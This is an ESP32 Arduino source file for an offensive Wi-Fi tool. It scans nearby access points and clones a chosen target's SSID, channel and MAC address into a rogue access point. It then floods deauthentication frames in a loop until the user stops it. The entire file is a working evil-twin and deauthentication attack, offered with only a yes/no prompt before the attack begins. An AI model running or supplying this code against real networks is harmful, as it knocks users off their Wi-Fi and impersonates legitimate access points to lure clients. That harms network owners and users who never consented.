#include "esp_wifi.h"
#include <WiFi.h>

enum State
{
    INIT,
    AP_SCAN,
    AP_SPOOF,
    DEAUTH,
    ATTACK, 
    END
};

enum State state = State::INIT;

struct AP_info
{
    String ssid;
    int channel;
    uint8_t mac[6];
    wifi_auth_mode_t authmode;
};

AP_info spoof_info;


void AccessPointScan()
{
    Serial.println("Starting scan...");
    int n = WiFi.scanNetworks();
    Serial.println("Scan complete.");
    if (n == 0)
    {
        Serial.println("No networks found.");
    }
    else
    {
        Serial.printf("Found %d networks:\n", n);
        Serial.println("Index SSID:\t\t MAC Address:\n");
        for (int i = 0; i < n; ++i)
        {
            // Print Index, SSID, and MAC address
            Serial.printf(
                "%d\t%s\t%s\n",
                i+1,
                WiFi.SSID(i).c_str(),
                WiFi.BSSIDstr(i).c_str()
            );
            delay(10);
        }
    }
    Serial.println("Select target AP by index, 0 to rescan");
    delay(5000);
    while (!Serial.available()) delay(100);   // Wait for input
    int x = Serial.parseInt();
    if (x == 0) {
        Serial.println("Rescanning...");
        WiFi.scanDelete();
        return;
    } else if (x > n) {
        Serial.println("Please select an available index, Rescanning...");
        WiFi.scanDelete();
        return;
    }
    x--; // decriment to select
    spoof_info = AP_info{WiFi.SSID(x), WiFi.channel(x), WiFi.encryptionType(x)};
    memcpy(spoof_info.mac, WiFi.BSSID(x), 6);
    state = State::AP_SPOOF;
    WiFi.scanDelete();
}

void SpoofAccessPoint()
{
    WiFi.disconnect(true);
    esp_wifi_stop();  // Stop Wi-Fi
    delay(200);
    esp_wifi_deinit();
    delay(200);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);
    delay(100);

    auto err = esp_wifi_set_mac(WIFI_IF_AP, spoof_info.mac);  // Change MAC
    switch (err) {
        case ESP_OK: Serial.println("Successful MAC Change"); break;
        case ESP_ERR_WIFI_NOT_INIT: Serial.println("WiFi is not initialized by esp_wifi_init"); break;
        case ESP_ERR_INVALID_ARG: Serial.println("invalid argument"); break;
        case ESP_ERR_WIFI_IF: Serial.println("invalid interface"); break;
        case ESP_ERR_WIFI_MAC: Serial.println("invalid mac address"); break;
        case ESP_ERR_WIFI_MODE: Serial.println("WiFi mode is wrong"); break;
        default: Serial.println("Bad juju, consult esp err");
    }
    
    wifi_config_t apConfig = {};
    strncpy((char *)apConfig.ap.ssid, spoof_info.ssid.c_str(), sizeof(apConfig.ap.ssid));
    apConfig.ap.ssid_len = spoof_info.ssid.length();
    apConfig.ap.channel = spoof_info.channel;
    apConfig.ap.max_connection = 10; // Max clients
    apConfig.ap.authmode = WIFI_AUTH_WPA2_PSK;
    if (spoof_info.authmode == WIFI_AUTH_WPA2_PSK || spoof_info.authmode == WIFI_AUTH_WPA_PSK)
        strcpy((char *)apConfig.ap.password, "verysecurepassword");


    esp_wifi_set_config(WIFI_IF_AP, &apConfig); delay(200);
    esp_wifi_start();
    Serial.printf("Started AP spoof with SSID: %s, Channel: %d\n", spoof_info.ssid.c_str(), spoof_info.channel);
    state = State::DEAUTH;
}
unsigned long startTime;
int attackFrames {0};
void DeauthBegin()
{
    Serial.println("Are you sure Y/n");
    while (!Serial.available()) delay(100);
    int rsp = Serial.read();
    switch (rsp)
    {
    case 'Y':
        Serial.println("ATTACKING...");
        state = State::ATTACK;
        startTime = millis();
        Serial.println("input 'stop' to stop attack");
        break;
    default:
        Serial.println("Aborting...");
        state = State::END;
    }

}

void DeauthAttack() {
    if(Serial.available() > 0) {
        String input = Serial.readString();
        if ("stop" == input) {
            double t = (double) (millis() - startTime) * 1e-3;
            Serial.printf("Broadcast %d attack frames, in %lf seconds\n\n",  attackFrames, t);
            state = State::END;
        }
    }
    esp_wifi_deauth_sta(0);
    attackFrames++;
    delay(10);
}


void setup()
{
    Serial.begin(115200);
    WiFi.mode(WIFI_MODE_STA); // Set ESP32 to Station mode
    WiFi.disconnect();        // Ensure we start clean
    delay(100);               // Short delay to stabilize 100

    Serial.println("Starting espPommeDeTerre...");
    Serial.printf("MAC adress: %s\n", WiFi.macAddress().c_str());
    state = State::AP_SCAN;
}

void loop()
{
    switch (state) {
        case State::AP_SCAN:
            AccessPointScan();
            break;
        case State::AP_SPOOF:
            SpoofAccessPoint();
            break;
        case State::DEAUTH:
            DeauthBegin();
            break;
        case State::ATTACK:
            DeauthAttack();
            break;
        case State::END:
            WiFi.disconnect(true);
            while(true) delay(100); // Idle until reset
    }
}